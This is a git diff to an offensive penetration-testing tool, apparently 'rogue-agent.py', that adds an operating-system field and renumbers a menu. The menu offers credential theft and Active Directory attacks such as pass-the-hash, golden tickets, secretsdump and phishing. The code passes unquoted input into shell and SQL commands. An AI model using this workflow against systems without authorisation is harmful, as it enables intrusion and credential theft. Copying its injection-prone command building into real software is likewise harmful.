@@ -183,7 +183,8 @@ def wipeTokens(VALD):
    return
    
 def saveParams():
-   localCOM("echo '" + COM + "' | base64 --wrap=0 >  base64.tmp")
+   localCOM("echo '" + OSF + "' | base64 --wrap=0 >  base64.tmp")
+   localCOM("echo '" + COM + "' | base64 --wrap=0 >> base64.tmp")
    localCOM("echo '" + DNS + "' | base64 --wrap=0 >> base64.tmp")
    localCOM("echo '" + TIP + "' | base64 --wrap=0 >> base64.tmp")   
    localCOM("echo '" + PTS + "' | base64 --wrap=0 >> base64.tmp")
@@ -196,19 +197,21 @@ def saveParams():
    localCOM("echo '" + SID + "' | base64 --wrap=0 >> base64.tmp")
    localCOM("echo '" + TSH + "' | base64 --wrap=0 >> base64.tmp")    
      
-   COM2 = linecache.getline("base64.tmp", 1).rstrip("\n")
-   DNS2 = linecache.getline("base64.tmp", 2).rstrip("\n")
-   TIP2 = linecache.getline("base64.tmp", 3).rstrip("\n")
-   PTS2 = linecache.getline("base64.tmp", 4).rstrip("\n")
-   WEB2 = linecache.getline("base64.tmp", 5).rstrip("\n")
-   USR2 = linecache.getline("base64.tmp", 6).rstrip("\n")
-   PAS2 = linecache.getline("base64.tmp", 7).rstrip("\n")
-   NTM2 = linecache.getline("base64.tmp", 8).rstrip("\n")
-   TGT2 = linecache.getline("base64.tmp", 9).rstrip("\n")
-   DOM2 = linecache.getline("base64.tmp", 10).rstrip("\n")
-   SID2 = linecache.getline("base64.tmp", 11).rstrip("\n")
-   TSH2 = linecache.getline("base64.tmp", 12).rstrip("\n")   
+   OSF2 = linecache.getline("base64.tmp", 1).rstrip("\n")  
+   COM2 = linecache.getline("base64.tmp", 2).rstrip("\n")
+   DNS2 = linecache.getline("base64.tmp", 3).rstrip("\n")
+   TIP2 = linecache.getline("base64.tmp", 4).rstrip("\n")
+   PTS2 = linecache.getline("base64.tmp", 5).rstrip("\n")
+   WEB2 = linecache.getline("base64.tmp", 6).rstrip("\n")
+   USR2 = linecache.getline("base64.tmp", 7).rstrip("\n")
+   PAS2 = linecache.getline("base64.tmp", 8).rstrip("\n")
+   NTM2 = linecache.getline("base64.tmp", 9).rstrip("\n")
+   TGT2 = linecache.getline("base64.tmp", 10).rstrip("\n")
+   DOM2 = linecache.getline("base64.tmp", 11).rstrip("\n")
+   SID2 = linecache.getline("base64.tmp", 12).rstrip("\n")
+   TSH2 = linecache.getline("base64.tmp", 13).rstrip("\n")   
    
+   cursor.execute("UPDATE REMOTETARGET SET OSF = \"" + OSF2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET COM = \"" + COM2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET DNS = \"" + DNS2 + "\" WHERE IDS = 1"); connection.commit()
    cursor.execute("UPDATE REMOTETARGET SET TIP = \"" + TIP2 + "\" WHERE IDS = 1"); connection.commit()
@@ -245,7 +248,7 @@ def checkPorts(PTS, POR):
    checkParams = test_TIP()  
    if checkParams != 1:
       print(colored("[*] Attempting to enumerate live ports, please wait as this can take sometime...", colour3))
-      remotCOM("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -sT -sU -T4 " + TIP.rstrip(" ") + " | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
+      remotCOM("ports=$(nmap " + IP46 + " -p- --min-rate=1000 -sT -sU -T4 " + TIP.rstrip(" ") + " | tee > ports.tmp | grep ^[0-9] | cut -d '/' -f 1 | tr '\\n' ',' | sed s/,$//); echo $ports > PORTS.tmp")
       PTS = linecache.getline("PORTS.tmp", 1).rstrip("\n")
             
       if PTS[:1] == "":
@@ -498,11 +501,11 @@ def dispMenu():
    print('\u2551' + (" ")*1 + colored("SHARENAME",colour5) + (" ")*7 + colored("TYPE",colour5) + (" ")*6 + colored("COMMENT",colour5) + (" ")*12 + '\u2551' + (" ")*1 + colored("USERNAME",colour5) + (" ")*16 + colored("NTFS PASSWORD HASH",colour5) + (" ")*15 + '\u2551') 
    print('\u2560' + ('\u2550')*14 + '\u256C' + ('\u2550')*42 + '\u256C' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*58 + '\u2563')
    
-   print('\u2551' + " DNS ADDRESS  " + '\u2551', end=' ')
-   if DNS[:5] == "EMPTY":
-      print(colored(DNS[:COL1],colour7), end=' ')
+   print('\u2551' + " O/S  FORMAT  " + '\u2551', end=' ')
+   if OSF[:5] == "EMPTY":
+      print(colored(OSF[:COL1],colour7), end=' ')
    else:
-      print(colored(DNS[:COL1],colour6), end=' ')
+      print(colored(OSF[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[0]:
       print(colored(SHAR[0],colour3), end=' ')
@@ -515,13 +518,13 @@ def dispMenu():
    else:
       print(colored(USER[0],colour6), end=' ')
       print(colored(HASH[0],colour6), end=' ')   
-   print('\u2551')
+   print('\u2551')   
    
-   print('\u2551' + " IP  ADDRESS  " + '\u2551', end=' ')
-   if TIP[:5] == "EMPTY":
-      print(colored(TIP[:COL1],colour7), end=' ')
+   print('\u2551' + " DNS ADDRESS  " + '\u2551', end=' ')
+   if DNS[:5] == "EMPTY":
+      print(colored(DNS[:COL1],colour7), end=' ')
    else:
-      print(colored(TIP[:COL1],colour6), end=' ')
+      print(colored(DNS[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[1]:
       print(colored(SHAR[1],colour3), end=' ')
@@ -533,15 +536,14 @@ def dispMenu():
       print(colored(HASH[1],colour2), end=' ')
    else:
       print(colored(USER[1],colour6), end=' ')
-      print(colored(HASH[1],colour6), end=' ')         
+      print(colored(HASH[1],colour6), end=' ')   
    print('\u2551')
    
-   print('\u2551' + " LIVE  PORTS  " + '\u2551', end=' ')
-   if POR[:5] == "EMPTY":
-      print(colored(POR[:COL1],colour7), end=' ')
+   print('\u2551' + " IP  ADDRESS  " + '\u2551', end=' ')
+   if TIP[:5] == "EMPTY":
+      print(colored(TIP[:COL1],colour7), end=' ')
    else:
-      lastChar = POR[COL1-1]
-      print(colored(POR[:COL1-1],colour6) + colored(lastChar,colour0), end=' ')
+      print(colored(TIP[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[2]:
       print(colored(SHAR[2],colour3), end=' ')
@@ -556,11 +558,12 @@ def dispMenu():
       print(colored(HASH[2],colour6), end=' ')         
    print('\u2551')
    
-   print('\u2551' + " WEBSITE URL  " + '\u2551', end=' ')
-   if WEB[:5] == "EMPTY":
-      print(colored(WEB[:COL1],colour7), end=' ')
+   print('\u2551' + " LIVE  PORTS  " + '\u2551', end=' ')
+   if POR[:5] == "EMPTY":
+      print(colored(POR[:COL1],colour7), end=' ')
    else:
-      print(colored(WEB[:COL1],colour6), end=' ')
+      lastChar = POR[COL1-1]
+      print(colored(POR[:COL1-1],colour6) + colored(lastChar,colour0), end=' ')
    print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[3]:
       print(colored(SHAR[3],colour3), end=' ')
@@ -575,23 +578,42 @@ def dispMenu():
       print(colored(HASH[3],colour6), end=' ')         
    print('\u2551')
    
+   print('\u2551' + " WEBSITE URL  " + '\u2551', end=' ')
+   if WEB[:5] == "EMPTY":
+      print(colored(WEB[:COL1],colour7), end=' ')
+   else:
+      print(colored(WEB[:COL1],colour6), end=' ')
+   print('\u2551', end=' ')   
+   if TSH.rstrip(" ") in SHAR[4]:
+      print(colored(SHAR[4],colour3), end=' ')
+   else:
+      print(colored(SHAR[4],colour6), end=' ')   
+   print('\u2551', end=' ')   
+   if VALD[4] == "1":
+      print(colored(USER[4],colour2), end=' ')
+      print(colored(HASH[4],colour2), end=' ')
+   else:
+      print(colored(USER[4],colour6), end=' ')
+      print(colored(HASH[4],colour6), end=' ')         
+   print('\u2551')
+   
    print('\u2551' + " USER   NAME  " + '\u2551', end=' ')
    if USR[:2] == "''":
       print(colored(USR[:COL1],colour7), end=' ')
    else:
       print(colored(USR[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[4]:
-      print(colored(SHAR[4],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[5]:
+      print(colored(SHAR[5],colour3), end=' ')
    else:
-      print(colored(SHAR[4],colour6), end=' ')   
+      print(colored(SHAR[5],colour6), end=' ')   
    print('\u2551', end=' ')
-   if VALD[4] == "1":
-      print(colored(USER[4],colour2), end=' ')
-      print(colored(HASH[4],colour2), end=' ')
+   if VALD[5] == "1":
+      print(colored(USER[5],colour2), end=' ')
+      print(colored(HASH[5],colour2), end=' ')
    else:
-      print(colored(USER[4],colour6), end=' ')
-      print(colored(HASH[4],colour6), end=' ')   
+      print(colored(USER[5],colour6), end=' ')
+      print(colored(HASH[5],colour6), end=' ')   
    print('\u2551')
    
    print('\u2551' + " PASS   WORD  " + '\u2551', end=' ')
@@ -599,25 +621,6 @@ def dispMenu():
       print(colored(PAS[:COL1],colour7), end=' ')
    else:
       print(colored(PAS[:COL1],colour6), end=' ')
-   print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[5]:
-      print(colored(SHAR[5],colour3), end=' ')
-   else:
-      print(colored(SHAR[5],colour6), end=' ')   
-   print('\u2551', end=' ')   
-   if VALD[5] == "1":
-      print(colored(USER[5],colour2), end=' ')
-      print(colored(HASH[5],colour2), end=' ')
-   else:
-      print(colored(USER[5],colour6), end=' ')
-      print(colored(HASH[5],colour6), end=' ')         
-   print('\u2551')
-   
-   print('\u2551' + " NTLM   HASH  " + '\u2551', end=' ')
-   if NTM[:5] == "EMPTY":
-      print(colored(NTM[:COL1],colour7), end=' ')
-   else:
-      print(colored(NTM[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
    if TSH.rstrip(" ") in SHAR[6]:
       print(colored(SHAR[6],colour3), end=' ')
@@ -627,9 +630,28 @@ def dispMenu():
    if VALD[6] == "1":
       print(colored(USER[6],colour2), end=' ')
       print(colored(HASH[6],colour2), end=' ')
-   else:
+   else: 
       print(colored(USER[6],colour6), end=' ')
       print(colored(HASH[6],colour6), end=' ')         
+   print('\u2551')
+   
+   print('\u2551' + " NTLM   HASH  " + '\u2551', end=' ')
+   if NTM[:5] == "EMPTY":
+      print(colored(NTM[:COL1],colour7), end=' ')
+   else:
+      print(colored(NTM[:COL1],colour6), end=' ')
+   print('\u2551', end=' ')   
+   if TSH.rstrip(" ") in SHAR[7]:
+      print(colored(SHAR[7],colour3), end=' ')
+   else:
+      print(colored(SHAR[7],colour6), end=' ')   
+   print('\u2551', end=' ')   
+   if VALD[7] == "1":
+      print(colored(USER[7],colour2), end=' ')
+      print(colored(HASH[7],colour2), end=' ')
+   else:
+      print(colored(USER[7],colour6), end=' ')
+      print(colored(HASH[7],colour6), end=' ')         
    print('\u2551')
    
    print('\u2551' + " TICKET NAME  " + '\u2551', end=' ')
@@ -638,17 +660,17 @@ def dispMenu():
    else:
       print(colored(TGT[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[7]:
-      print(colored(SHAR[7],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[8]:
+      print(colored(SHAR[8],colour3), end=' ')
    else:
-      print(colored(SHAR[7],colour6), end=' ')   
+      print(colored(SHAR[8],colour6), end=' ')   
    print('\u2551', end=' ')   
-   if VALD[6] == "1":
-      print(colored(USER[7],colour2), end=' ')
-      print(colored(HASH[7],colour2), end=' ')
+   if VALD[8] == "1":
+      print(colored(USER[8],colour2), end=' ')
+      print(colored(HASH[8],colour2), end=' ')
    else:
-      print(colored(USER[7],colour6), end=' ')
-      print(colored(HASH[7],colour6), end=' ')         
+      print(colored(USER[8],colour6), end=' ')
+      print(colored(HASH[8],colour6), end=' ')         
    print('\u2551')
    
    print('\u2551' + " DOMAIN NAME  " + '\u2551', end=' ')
@@ -657,17 +679,17 @@ def dispMenu():
    else:
       print(colored(DOM[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[8]:
-      print(colored(SHAR[8],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[9]:
+      print(colored(SHAR[9],colour3), end=' ')
    else:
-      print(colored(SHAR[8],colour6), end=' ')      
+      print(colored(SHAR[9],colour6), end=' ')      
    print('\u2551', end=' ')   
-   if VALD[7] == "1":
-      print(colored(USER[8],colour2), end=' ')
-      print(colored(HASH[8],colour2), end=' ')
+   if VALD[9] == "1":
+      print(colored(USER[9],colour2), end=' ')
+      print(colored(HASH[9],colour2), end=' ')
    else:
-      print(colored(USER[8],colour6), end=' ')
-      print(colored(HASH[8],colour6), end=' ')         
+      print(colored(USER[9],colour6), end=' ')
+      print(colored(HASH[9],colour6), end=' ')         
    print('\u2551')
    
    print('\u2551' + " DOMAIN  SID  " + '\u2551', end=' ')
@@ -676,17 +698,17 @@ def dispMenu():
    else:
       print(colored(SID[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[9]:
-      print(colored(SHAR[9],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[10]:
+      print(colored(SHAR[10],colour3), end=' ')
    else:
-      print(colored(SHAR[9],colour6), end=' ')   
+      print(colored(SHAR[10],colour6), end=' ')   
    print('\u2551', end=' ')   
-   if VALD[8] == "1":
-      print(colored(USER[9],colour2), end=' ')
-      print(colored(HASH[9],colour2), end=' ')
+   if VALD[10] == "1":
+      print(colored(USER[10],colour2), end=' ')
+      print(colored(HASH[10],colour2), end=' ')
    else:
-      print(colored(USER[9],colour6), end=' ')
-      print(colored(HASH[9],colour6), end=' ')         
+      print(colored(USER[10],colour6), end=' ')
+      print(colored(HASH[10],colour6), end=' ')         
    print('\u2551')
    
    print('\u2551' + " SHARE  NAME  " + '\u2551', end=' ')
@@ -695,28 +717,28 @@ def dispMenu():
    else:
       print(colored(TSH[:COL1],colour6), end=' ')
    print('\u2551', end=' ')   
-   if TSH.rstrip(" ") in SHAR[10]:
-      print(colored(SHAR[10],colour3), end=' ')
+   if TSH.rstrip(" ") in SHAR[11]:
+      print(colored(SHAR[11],colour3), end=' ')
    else:
-      print(colored(SHAR[10],colour6), end=' ')      
+      print(colored(SHAR[11],colour6), end=' ')      
    print('\u2551', end=' ')   
-   if VALD[9] == "1":
-      print(colored(USER[10],colour2), end=' ')
-      print(colored(HASH[10],colour2), end=' ')
+   if VALD[11] == "1":
+      print(colored(USER[11],colour2), end=' ')
+      print(colored(HASH[11],colour2), end=' ')
    else:
-      if USER[11][:1] != "":
-         print(colored(USER[10],colour0), end=' ')
-         print(colored(HASH[10],colour0), end=' ')      
+      if USER[12][:1] != "":
+         print(colored(USER[11],colour0), end=' ')
+         print(colored(HASH[11],colour0), end=' ')      
       else:
-         print(colored(USER[10],colour6), end=' ')
-         print(colored(HASH[10],colour6), end=' ')
+         print(colored(USER[11],colour6), end=' ')
+         print(colored(HASH[11],colour6), end=' ')
    print('\u2551')
    
    print('\u2560' + ('\u2550')*14 + '\u2569' + ('\u2550')*42 + '\u2569' + ('\u2550')*25 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*58 + '\u2563')
    return
    
 def options():
-   print('\u2551' + "(01) Re/Set DNS ADDRESS (12) Compile Exploits (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) GoldenDCPAC (67) VulnScanner (78)", end = ' ')
+   print('\u2551' + "(01) Re/Set O/S FORMAT  (12) Re/Set SHARENAME (23) SyncTime (34) WinLDAP Search (45) Kerberos Info (56) GoldenDCPAC (67) VulnScanner (78)", end = ' ')
 
    if proxyChains == 1:
       print(colored(menuName,colour0, attrs=['blink']), end= ' ')
@@ -725,16 +747,16 @@ def options():
 
    print("(89) FTP     " + '\u2551')
 
-   print('\u2551' + "(02) Re/Set IP  ADDRESS (13) Start WEB Server (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Domain Dump (68) ExplScanner (79)             (90) SSH     " + '\u2551')     
-   print('\u2551' + "(03) Re/Set LIVE  PORTS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) Blood Hound (69) Expl Search (80) GenSSHKeyID (91) SSHKeyID" + '\u2551')   
-   print('\u2551' + "(04) Re/Set WEBSITE URL (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) BH ACL PAWN (70) FILE Editor (81)             (92) Telnet  " + '\u2551')
-   print('\u2551' + "(05) Re/Set USER   NAME (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) SecretsDump (71) GenListUser (82)             (93) Netcat  " + '\u2551')
-   print('\u2551' + "(06) Re/Set PASS   WORD (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) CrackMapExe (72) GenListPass (83)             (94) SQSH    " + '\u2551')
-   print('\u2551' + "(07) Re/Set NTLM   HASH (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) PSExec HASH (73) ManPhishCod (84) SNMP Walker (95) MSSQL   " + '\u2551')
-   print('\u2551' + "(08) Re/Set TICKET NAME (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) SmbExecHASH (74) AutoPhisher (85) Hail  Hydra (96) MySQL   " + '\u2551')
-   print('\u2551' + "(09) Re/Set DOMAIN NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Kerbe5 Ticket (64) WniExecHASH (75) DIR Searchs (86) MSFCon  TOM (97) WinRm   " + '\u2551')
-   print('\u2551' + "(10) Re/Set DOMAIN  SID (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Silver Ticket (65) Remote Sync (76) Nikto Scans (87) MSFCon  OWA (98) RemDesk " + '\u2551')
-   print('\u2551' + "(11) Re/Set SHARE  NAME (22) SubDOMAINS/VHOST (33) NFSMount (44) SmbMount SHARE (55) Golden Ticket (66) RSync Dumps (77) NTDSDECRYPT (88) MSFCon  RCE (99) Exit    " + '\u2551')
+   print('\u2551' + "(02) Re/Set DNS ADDRESS (13) Start WEB Server (24) Get Arch (35) Look up SecIDs (46) Kerberos Auth (57) Domain Dump (68) ExplScanner (79)             (90) SSH     " + '\u2551')     
+   print('\u2551' + "(03) Re/Set IP  ADDRESS (14) Start SMB Server (25) Net View (36) Sam Dump Users (47) KerberosBrute (58) Blood Hound (69) ExplSearchs (80) GenSSHKeyID (91) SSHKeyID" + '\u2551')   
+   print('\u2551' + "(04) Re/Set LIVE  PORTS (15) Start  Responder (26) Services (37) REGistry Hives (48) KerbeRoasting (59) BH ACL PAWN (70) ExplCompile (81)             (92) Telnet  " + '\u2551')
+   print('\u2551' + "(05) Re/Set WEBSITE URL (16) who  DNS ADDRESS (27) AT  Exec (38) Find EndPoints (49) ASREPRoasting (60) SecretsDump (71) FILE Editor (82)             (93) Netcat  " + '\u2551')
+   print('\u2551' + "(06) Re/Set USER   NAME (17) Dig  DNS ADDRESS (28) DComExec (39) Enum End Point (50) PASSWORD2HASH (61) CrackMapExe (72) GenListUser (83) NTDSDECRYPT (94) SQSH    " + '\u2551')
+   print('\u2551' + "(07) Re/Set PASS   WORD (18) Enum DNS ADDRESS (29) PS  Exec (40) RpcClient Serv (51) Pass the HASH (62) PSExec HASH (73) GenListPass (84) SNMP Walker (95) MSSQL   " + '\u2551')
+   print('\u2551' + "(08) Re/Set NTLM   HASH (19) Reco DNS ADDRESS (30) SMB Exec (41) SmbClient Serv (52) OverPass HASH (63) SmbExecHASH (74) ManPhishCod (85) Hail  Hydra (96) MySQL   " + '\u2551')
+   print('\u2551' + "(09) Re/Set TICKET NAME (20) Nmap LIVE  PORTS (31) WMI Exec (42) Smb Map SHARES (53) Kerbe5 Ticket (64) WniExecHASH (75) AutoPhisher (86) MSFCon  TOM (97) WinRm   " + '\u2551')
+   print('\u2551' + "(10) Re/Set DOMAIN NAME (21) Nmap PORTService (32) NFS List (43) Smb Dump Files (54) Silver Ticket (65) Remote Sync (76) DIR Searchs (87) MSFCon  OWA (98) RemDesk " + '\u2551')
+   print('\u2551' + "(11) Re/Set DOMAIN  SID (22) SubDOMAINS/VHOST (33) NFSMount (44) SmbMount SHARE (55) Golden Ticket (66) RSync Dumps (77) Nikto Scans (88) MSFCon  RCE (99) Exit    " + '\u2551')
    print('\u255A' + ('\u2550')*163 + '\u255D')
    return
 
@@ -775,7 +797,7 @@ colour6 = "green"
 colour7 = "yellow"
 colour8 = "magenta"
 
-Yellow  = '\e[1;93m'						# CATTING FILE COL
+Yellow  = '\e[1;93m'						# OP SYSTEM COLOUR
 Green   = '\e[0;32m'
 Reset   = '\e[0m'
 Red     = '\e[1;91m'
@@ -801,7 +823,7 @@ os.system("ifconfig -a | grep -E -o '.{0,5}: flag.{0,5}' | grep -E -o '.{0,5}:' 
 with open("up.tmp","r") as localInterface:
    up = localInterface.readlines()
 if netWork not in str(up):
-   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 725 of the rogue-agent.py file...", colour0))
+   print(colored("\n[!] WARNING!!! - You need to specify your local network interface on line 759 of the rogue-agent.py file...", colour0))
    exit(1)
 else:
    os.system("ip a s " + netWork + " | awk '/inet/ {print $2}' > localIP.tmp")
@@ -922,19 +944,21 @@ localCOM("echo " + col[9]  + " | base64 -d >> ascii.tmp")
 localCOM("echo " + col[10] + " | base64 -d >> ascii.tmp")
 localCOM("echo " + col[11] + " | base64 -d >> ascii.tmp")
 localCOM("echo " + col[12] + " | base64 -d >> ascii.tmp")
+localCOM("echo " + col[13] + " | base64 -d >> ascii.tmp")
 
-COM = linecache.getline("ascii.tmp", 1).rstrip("\n")
-DNS = linecache.getline("ascii.tmp", 2).rstrip("\n")
-TIP = linecache.getline("ascii.tmp", 3).rstrip("\n")
-PTS = linecache.getline("ascii.tmp", 4).rstrip("\n")
-WEB = linecache.getline("ascii.tmp", 5).rstrip("\n")
-USR = linecache.getline("ascii.tmp", 6).rstrip("\n")
-PAS = linecache.getline("ascii.tmp", 7).rstrip("\n")
-NTM = linecache.getline("ascii.tmp", 8).rstrip("\n")
-TGT = linecache.getline("ascii.tmp", 9).rstrip("\n")
-DOM = linecache.getline("ascii.tmp", 10).rstrip("\n")
-SID = linecache.getline("ascii.tmp", 11).rstrip("\n")
-TSH = linecache.getline("ascii.tmp", 12).rstrip("\n")
+OSF = linecache.getline("ascii.tmp", 1).rstrip("\n")
+COM = linecache.getline("ascii.tmp", 2).rstrip("\n")
+DNS = linecache.getline("ascii.tmp", 3).rstrip("\n")
+TIP = linecache.getline("ascii.tmp", 4).rstrip("\n")
+PTS = linecache.getline("ascii.tmp", 5).rstrip("\n")
+WEB = linecache.getline("ascii.tmp", 6).rstrip("\n")
+USR = linecache.getline("ascii.tmp", 7).rstrip("\n")
+PAS = linecache.getline("ascii.tmp", 8).rstrip("\n")
+NTM = linecache.getline("ascii.tmp", 9).rstrip("\n")
+TGT = linecache.getline("ascii.tmp", 10).rstrip("\n")
+DOM = linecache.getline("ascii.tmp", 11).rstrip("\n")
+SID = linecache.getline("ascii.tmp", 12).rstrip("\n")
+TSH = linecache.getline("ascii.tmp", 13).rstrip("\n")
 
 if USR.rstrip(" ") == "":
    USR = "\'\'"   
@@ -942,6 +966,7 @@ if PAS.rstrip(" ") == '':
    PAS = "\'\'"
 POR = PTS
 
+OSF = spacePadding(OSF, COL1)
 COM = spacePadding(COM, COL0)
 DNS = spacePadding(DNS, COL1)
 TIP = spacePadding(TIP, COL1)
@@ -968,7 +993,7 @@ with open(dataDir + "/usernames.txt", "r") as read1, open(dataDir + "/hashes.txt
       USER[x] = read1.readline()
       HASH[x] = read2.readline()
       VALD[x] = read3.readline()
-      SHAR[x] = read4.readline()      
+      SHAR[x] = read4.readline()            
       SHAR[x] = spacePadding(SHAR[x], COL2)         
       USER[x] = spacePadding(USER[x], COL3)
       HASH[x] = spacePadding(HASH[x], COL4)    
@@ -1036,7 +1061,9 @@ while True:
       errorCheck = linecache.getline("lsaquery.tmp", 1)                              
       if (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
          print("[-] Unable to connect to RPC data...")
-         checkParams = 1      
+         checkParams = 1
+      else:
+         print("[+] Connection successful...")      
          
       if checkParams != 1:
          print(colored("[*] Attempting to enumerate domain name...", colour3))               
@@ -1088,7 +1115,7 @@ while True:
          errorCheck = linecache.getline("shares.tmp", 1)
    
          if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-            print("[-] Unable to connect to RPC data...")
+            print("[-] Access to RPC data restricted...")
          else:
             for x in range(0, maxUser):
                SHAR[x] = " "*COL2
@@ -1120,7 +1147,7 @@ while True:
             remotCOM("rpcclient -W '' -U " + USR.rstrip(" ") + "%" + PAS.rstrip(" ") + " " + TIP.rstrip(" ") + " -c 'enumdomusers' > domusers.tmp")               
          errorCheck = linecache.getline("domusers.tmp", 1)
          if (errorCheck[:9] == "Could not") or (errorCheck[:6] == "result") or (errorCheck[:6] == "Cannot") or (errorCheck[:1] == "") or "ACCESS_DENIED" in errorCheck:
-            print("[-] Unable to connect to RPC data...")
+            print("[-] Access to RPC data restricted...")
          else:               
             localCOM("rm " + dataDir + "/usernames.txt")
             localCOM("rm " + dataDir + "/hashes.txt")                   
@@ -1162,6 +1189,46 @@ while True:
             localCOM("sed -i '/^s*$/d' policy.tmp 2>&1")
             catsFile("policy.tmp")
       prompt()
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - 
+# Details : 
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '1':
+      BAK = OSF
+      OSF = input("[?] Please enter O/S format: ")
+      
+      found = 0
+      
+      if OSF != "":
+         OSF = OSF.upper()
+         if "EMPTY" in OSF:
+            found = 1
+         if "WINDOWS" in OSF:
+            found = 1
+         if "LINUX" in OSF:
+            found = 1
+         if "OS X " in OSF:
+            found = 1
+         if "ANDROID" in OSF:
+            found = 1
+         if "IOS" in OSF:
+            found = 1
+         if found == 0:
+            print("[-] Operating system not found...")
+            OSF = BAK
+         else:
+            print("[+] O/S succesfully set to " + OSF)
+            OSF = spacePadding(OSF, COL1)
+      else:
+         print("[-] No changes were made...")
+         OSF = BAK
+      prompt()      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
@@ -1171,7 +1238,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='1':
+   if selection =='2':
       BAK = DNS
       DNS = input("[?] Please enter DNS IP address: ")
       
@@ -1215,7 +1282,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection =='2':
+   if selection =='3':
       BAK = TIP
       TIP = input("[?] Please enter remote IP address: ").upper()
       TIP = spacePadding(TIP, COL1)
@@ -1269,7 +1336,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '3':
+   if selection == '4':
       print("[i] Current live port listing: " + PTS)
       BAK = POR
       POR = input("[?] Please enter port numbers: ")
@@ -1288,7 +1355,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '4':
+   if selection == '5':
       BAK = WEB
       WEB = input("[?] Please enter the web address: ")
       
@@ -1318,7 +1385,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '5':
+   if selection == '6':
       BAK = USR
       USR = input("[?] Please enter username: ")
       if USR == "":
@@ -1355,7 +1422,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '6':
+   if selection == '7':
       BAK = PAS
       PAS = input("[?] Please enter password: ")
       
@@ -1384,7 +1451,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '7':
+   if selection == '8':
       BAK = NTM
       NTM = input("[?] Please enter hash value: ")
       
@@ -1401,10 +1468,9 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '8':
+   if selection == '9':
       BAK = TGT
-      TGT = input("[?] Please enter ticket name: ")
-      
+      TGT = input("[?] Please enter ticket name: ")      
       
       if TGT != "":
          TGT = spacePadding(TGT, COL1)
@@ -1419,7 +1485,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '9':
+   if selection == '10':
       BAK = DOM
       DOM = input("[?] Please enter domain name: ")
       
@@ -1448,7 +1514,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '10':
+   if selection == '11':
       BAK = SID
       SID = input("[?] Please enter domain SID value: ")
       
@@ -1456,7 +1522,7 @@ while True:
          SID = spacePadding(SID, COL1)
       else:
          SID = BAK
-
+ 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
@@ -1465,7 +1531,7 @@ while True:
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '11':
+   if selection == '12':
       BAK = TSH
       TSH = input("[?] Please enter share name: ")
       
@@ -1473,69 +1539,6 @@ while True:
          TSH = spacePadding(TSH,COL1)
       else:
          TSH = BAK    
-      
-# ------------------------------------------------------------------------------------- 
-# AUTHOR  : Terence Broadbent                                                    
-# CONTRACT: GitHub
-# Version : TREADSTONE                                                             
-# Details : Menu option selected - Create locally defined exploit files.
-# Details : 
-# Modified: N/A
-# -------------------------------------------------------------------------------------
-
-   if selection == '12':
-      checkParams = getPort()
-      
